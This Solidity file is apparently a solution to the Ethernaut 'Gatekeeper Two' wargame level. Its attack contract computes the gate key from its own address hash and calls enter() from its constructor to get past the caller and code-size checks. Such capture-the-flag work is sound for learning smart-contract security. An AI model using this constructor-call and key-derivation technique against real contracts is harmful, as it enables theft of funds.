// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract GatekeeperTwoAttack {
    constructor(address _target) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 key = bytes8(s ^ type(uint64).max);
        
        bytes memory callData = abi.encodeWithSignature("enter(bytes8)", key);

        (bool success, bytes memory result) = _target.call(callData);

        if (success == false) {
            if (result.length == 0) {
                revert();
            }
            assembly {
                revert(add(32, result), mload(result))
            }
        }
    }
}
